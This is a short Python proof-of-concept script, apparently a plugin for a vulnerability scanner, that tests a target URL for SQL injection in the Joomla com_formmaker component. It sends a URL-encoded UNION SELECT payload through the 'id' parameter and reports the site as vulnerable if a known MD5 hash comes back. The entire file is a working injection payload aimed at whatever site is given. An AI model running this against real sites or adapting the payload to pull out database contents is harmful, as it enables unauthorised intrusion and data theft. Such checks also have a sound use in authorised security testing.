#!/usr/bin/python
# -*- coding:utf-8
import re,sys
sys.path.append('..')
from expFunc import *

url=sys.argv[1]
payload ="/index.php?option=com_formmaker&view=formmaker&id=1%20UNION%20ALL%20SELECT%20NULL,%20NULL,NULL,NULL,NULL,CONCAT(0x7165696a71,IFNULL(CAST(md5(3.1415)%20AS%20CHAR),0x20),%200x7175647871),NULL,NULL,NULL,NULL,NULL,NULL,NULL%23"
bug ="63e1f04640e83605c1d177544a5a0488"
info ="/index.php?option=com_formmaker&view=formmaker&id=1%20UNION%20ALL%20SELECT%20NULL,%20NULL,NULL,NULL,NULL,CONCAT(0x7165696a71,IFNULL(CAST(md5(3.1415)%20AS%20CHAR),0x20),%200x7175647871),NULL,NULL,NULL,NULL,NULL,NULL,NULL%23" 

def main():
    res = HttpGet(url+payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
    if res[0].find(bug)!= -1:
        print(Result+url+info);


main()
